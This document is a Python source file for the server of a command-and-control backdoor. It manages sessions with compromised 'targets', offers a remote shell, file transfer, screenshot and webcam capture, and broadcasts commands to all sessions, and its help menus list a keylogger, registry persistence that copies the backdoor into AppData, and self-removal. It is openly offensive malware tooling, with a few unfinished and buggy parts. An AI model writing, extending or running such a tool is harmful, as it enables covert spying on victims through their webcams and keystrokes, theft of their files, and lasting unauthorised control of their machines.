# Standard library imports
import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading

# Local application/library specific imports
from colour import banner, Colour

# Global Variables
global start_flag

# Constants
SCREENSHOT_DIR = 'images/screenshots'
SCREENSHOT_CHUNK_SIZE = 10485760  # 10MB
SCREENSHOT_TIMEOUT = 3

WEBCAM_DIR = './images/webcam'
WEBCAM_CHUNK_SIZE = 10485760  # 10MB
WEBCAM_TIMEOUT = 10


def reliable_recv(target):
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            # If received data is not a complete JSON, continue receiving.
            continue
        except socket.error as e:
            print(f"Socket error: {e}")
            return None
        except Exception as e:
            # Handle any other exceptions that may occur.
            print(f"Unexpected error: {e}")
            return None


def reliable_send(target, data):
    jsondata = json.dumps(data)
    while True:
        try:
            target.send(jsondata.encode())
            break
        except BrokenPipeError:
            # print("Connection to target lost.")
            break
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            break


# This function is to stop server.py issuing reliable_send if command='help' or 'clear'
# Creates less network traffic.
def exclusion_words(command):
    exclusion_words = ['help', 'clear']  # consider making this a global constant
    return any(word in command for word in exclusion_words)


def upload_file(target, file_name):
    try:
        f = open(file_name, 'rb')
        data = f.read()
        f.close()
    except FileNotFoundError:
        print(f"The file {file_name} does not exist.")
        return
    except IOError as e:
        print(f"Error reading from {file_name}: {e}")
        return

    try:
        target.send(data)
    except socket.error as e:
        print(f"Error sending data: {e}")
        return

    print(f"File {file_name} uploaded successfully.")


def download_file(target, file_name):
    try:
        f = open(file_name, 'wb')
    except IOError as e:
        print(f"Error opening file {file_name} for writing: {e}")
        return

    target.settimeout(2)
    chunk = None
    
    try:
        while True:
            try:
                if chunk is not None:
                    f.write(chunk)
                chunk = target.recv(1024)
            except socket.timeout:
                break  # Exit the loop if a timeout occurs
    except socket.error as e:
        print(f"Error receiving data: {e}")
    finally:
        f.close()

    target.settimeout(None)

    print(f"File {file_name} downloaded successfully.")


def validate_checksum(checksum1, checksum2):
    if checksum1 == checksum2:
        return True
    else:
        return False


def calculate_sha256_checksum(file_name):
    """
    Calculate the SHA-256 checksum of a file.
    Args:
        file_name (str): The name of the file to check.
    Returns:
        str: The SHA-256 checksum of the file.
    """
    sha256_hash = hashlib.sha256()
    with open(file_name,"rb") as f:
        for byte_block in iter(lambda: f.read(4096),b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()


def calculate_md5_checksum(file_name):
    """
    Calculate the MD5 checksum of a file.
    Args:
        file_name (str): The name of the file to check.
    Returns:
        str: The MD5 checksum of the file.
    """
    md5_hash = hashlib.md5()
    with open(file_name,"rb") as f:
        for byte_block in iter(lambda: f.read(4096),b""):
            md5_hash.update(byte_block)
    return md5_hash.hexdigest()


# TODO: Write a function for checksum validation on client-side.


def screenshot(target, count):
    """
    Take a screenshot and save it to a file.
    Args:
        target (socket): The target socket to instruct.
        count (int): The current screenshot count.
    """
    # Ensure the screenshots directory exists.
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
    try:
        f = open(file_name, 'wb')
    except IOError as e:
        print(f"Error opening file {file_name} for writing: {e}")
        return count

    # Receive the screenshot data.
    target.settimeout(SCREENSHOT_TIMEOUT)
    chunk = None
    try:
        while True:
            try:
                if chunk is not None:
                    f.write(chunk)
                chunk = target.recv(SCREENSHOT_CHUNK_SIZE)
            except socket.timeout:
                break  # Exit the loop if a timeout occurs
    except socket.error as e:
        print(f"Error receiving data: {e}")
    finally:
        f.close()

    target.settimeout(None)
    print(f"Screenshot saved to {file_name}")

    count += 1
    return count


def webcam(target, count):
    """
    Capture a webcam image and save it to a file.
    Args:
        target (socket): The target socket to instruct.
        count (int): The current image count.
    """
    # Ensure the webcam images directory exists.
    os.makedirs(WEBCAM_DIR, exist_ok=True)

    # Open the file for writing.
    file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
    try:
        f = open(file_name, 'wb')
    except IOError as e:
        print(f"Error opening file {file_name} for writing: {e}")
        return count

    # Receive the image data.
    target.settimeout(WEBCAM_TIMEOUT)
    chunk = None
    try:
        while True:
            try:
                if chunk is not None:
                    f.write(chunk)
                chunk = target.recv(WEBCAM_CHUNK_SIZE)
            except socket.timeout:
                break  # Exit the loop if a timeout occurs
    except socket.error as e:
        print(f"Error receiving data: {e}")
    finally:
        f.close()

    target.settimeout(None)
    print(f"Webcam image saved to {file_name}")

    return count + 1

# TODO: webcam(target) takes a quick webcam image
# https://stackoverflow.com/a/69282582/4443012

# TODO: encrypt()
# TODO: decrypt() functions using RSA library AES128-GCM

# TODO: use Flask to create a frontend UI in the web browser to manage C2 https://github.com/Tomiwa-Ot/moukthar


def server_help_manual():
    print('''\n
    quit                                --> Quit Session With The Target
    clear                               --> Clear The Screen
    background / bg                     --> Send Session With Target To Background
    cd *Directory name*                 --> Changes Directory On Target System
    upload *file name*                  --> Upload File To The Target Machine From Working Dir 
    download *file name*                --> Download File From Target Machine
    get *url*                           --> Download File From Specified URL to Target ./
    keylog_start                        --> Start The Keylogger
    keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
    keylog_stop                         --> Stop And Self Destruct Keylogger File
    screenshot                          --> Takes screenshot and sends to server ./images/screenshots/
    webcam                              --> Takes image with webcam and sends to ./images/webcam/
    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    
    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges


    \n''')


def c2_help_manual():
    print('''\n
    ===Command and Control (C2) Manual===

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
    \n''')


def target_communication(target, ip):
    screenshot_count = 0
    webcam_count = 0

    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background' or command == 'bg':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            screenshot(target, screenshot_count)
            screenshot_count += 1
        elif command[:6] == 'webcam':
            webcam(target, webcam_count)
            webcam_count += 1
        elif command == 'help':
            server_help_manual()
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    while True:
        if start_flag == False:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
            print(Colour().green(str(ip) + ' has connected!') +
                  '\n[**] Command & Control Center: ', end="")
        except:
            pass


def close_all_target_connections(targets):
    for target in targets:
        reliable_send(target, 'quit')
        target.close()


def send_heartbeat(target):
    while True:
        reliable_send(target, 'heartbeat')
        time.sleep(10)  # adjust the sleep time as needed


def send_heartbeat_to_all_targets(targets):
    
    while True:
        for target in targets:
            reliable_send(target, 'heartbeat')
            start_time = time.time()
            while True:
                if time.time() - start_time > heartbeat_timeout:  # timeout after 10 seconds
                    print(f"Target {target} did not respond to heartbeat. It might be down.", end="")
                    c2_input_text()
                    # handle target not responding here (e.g., remove from list, try to reconnect, etc.)
                    break
                try:
                    message = reliable_recv(target)
                    if message == 'heartbeat_ack':
                        break  # heartbeat acknowledged, break inner loop and move to next target
                except Exception as e:
                    print(f"An error occurred while waiting for heartbeat acknowledgment: {e}", end="")
                    c2_input_text()
                    break  # if an error occurred, break inner loop and move to next target
        time.sleep(heartbeat_wait)  # adjust the sleep time as needed


def c2_input_text():
    print('\n[**] Command & Control Center: ', end="")


def show_targets(ips):
    counter = 0
    for ip in ips:
        print('Session ' + str(counter) + ' --- ' + str(ip))
        counter += 1

def graceful_exit():
    try:
        # Your script's code...
        if input('\nDo you want to exit? yes/no: ') == 'yes':
            sys.exit()  # Use sys.exit() instead of quit()
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit()
    except SystemExit:
        # Handle the SystemExit exception. You could do some cleanup here if necessary.
        print("\nExiting the script...")
        sys.exit()  # Exit the script
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)  # Exit the script with an error status code


def kill_target(targets, ips, command):
    """
    Kills a target specified in the command.
    Args:
        targets (list): The list of targets.
        ips (list): The list of IPs.
        command (str): The command that specifies which target to kill.
    """
    target_index = int(command[5:])
    target = targets[target_index]
    ip = ips[target_index]
    reliable_send(target, 'quit')
    target.close()
    targets.remove(target)
    ips.remove(ip)


def send_all(targets, command):
    """
    Sends a command to all targets.
    Args:
        targets (list): The list of targets to send the command to.
        command (str): The command to send.
    """
    target_count = len(targets)
    print(Colour.blue(f'Number of sessions {target_count}'))
    print(Colour.green('Target sessions!'))
    i = 0
    try:
        while i < target_count:
            target = targets[i]
            print(target)
            reliable_send(target, command)
            i += 1
    except Exception as e:
        print(f'Failed to send command to all targets. Error: {e}')

def handle_session_command(targets, ips, command):
    """
    Handles a 'session' command.
    Args:
        targets (list): The list of targets.
        ips (list): The list of IPs.
        command (str): The command to handle.
    """
    try:
        session_id = int(command[8:])
        target = targets[session_id]
        ip = ips[session_id]
        target_communication(target, ip)
    except Exception as e:
        print('[-] No Session Under That ID Number. Error: ', e)


def exit_all(targets, sock, t1):
    """
    Exits all connections with targets, closes the socket, and stops the thread.
    Args:
        targets (list): The list of targets to disconnect from.
        sock (socket): The socket to close.
        t1 (Thread): The thread to stop.
    """
    start_flag = True
    for target in targets:
        reliable_send(target, 'quit')
        target.close()
    sock.close()
    t1.join()


def list_targets(ips):
    """
    Lists all the targets.
    Args:
        ips (list): The list of IPs.
    """
    for counter, ip in enumerate(ips):
        print('Session ' + str(counter) + ' --- ' + str(ip))


def clear_c2_console():
    """
    Clears the console.
    """
    os.system('clear')


def print_command_does_not_exist():
    """
    Prints a message indicating that the command does not exist.
    """
    print(Colour().red('[!!] Command Doesn\'t Exist'), end=" - ")
    print(Colour.yellow('Try running `help` command'), end="\n")


def handle_keyboard_interrupt():
    """
    Handles KeyboardInterrupt and SystemExit exceptions.
    """
    print(Colour().blue('\nPlease use "exit" command'))


def handle_value_error(e):
    """
    Handles ValueError exceptions.
    Args:
        e (Exception): The exception to handle.
    """
    print(Colour().red('[!!] ValueError: ' + str(e)))


def initialise_socket():
    """
    Initializes the socket.
    Returns:
        The initialized socket.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    return sock


def start_accepting_connections(sock):
    """
    Starts a thread to accept connections.
    Args:
        sock (socket): The socket on which to accept connections.
    Returns:
        The thread object.
    """
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    return t1


def print_banner_and_initial_info():
    """
    Prints the banner and information messages.
    """
    print(banner())
    print('Run "help" command to see the usage manual')
    print(Colour().green('[+] Waiting For The Incoming Connections ...'))


def join_thread(t1):
    t1.join()


def close_socket(sock):
    sock.close()
    global start_flag
    start_flag = False


def exit_c2_server(sock, t1):
    close_socket(sock)
    join_thread(t1)
    print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))


def run_c2_server(targets, ips, sock, t1, start_flag):
    """
    Runs the Command & Control server.
    Args:
        targets (list): The list of target connections.
        ips (list): The list of IP addresses of the targets.
        sock (socket): The server socket.
        t1 (threading.Thread): The thread that's accepting connections.
        start_flag (bool): Flag indicating whether to start or stop the server.
    """
    
    while start_flag:
        try:
            command = input('[**] Command & Control Center: ')
            if command == 'targets':
                list_targets(ips)
            elif command == 'clear':
                clear_c2_console()
            elif command[:7] == 'session':
                handle_session_command(targets, ips, command)
            elif command == 'exit':
                close_all_target_connections(targets)
                start_flag = exit_c2_server(sock, t1)
            elif command[:4] == 'kill':
                kill_target(targets, ips, command)
            elif command[:7] == 'sendall':
                send_all(targets, command)
            elif command[:4] == 'help':
                c2_help_manual()
            elif command[:9] == 'heartbeat':
                continue
            elif command == 'heartbeat_all':
                continue
            else:
                print_command_does_not_exist()
        except (KeyboardInterrupt, SystemExit):
            handle_keyboard_interrupt()
        except ValueError as e:
            handle_value_error(e)


if __name__ == '__main__':
    targets = []
    ips = []
    start_flag = True

    sock = initialise_socket()
    t1 = start_accepting_connections(sock)
    print_banner_and_initial_info()

    run_c2_server(targets, ips, sock, t1, start_flag)

# TODO: encrypt connection
# TODO: Implement a 'heartbeat'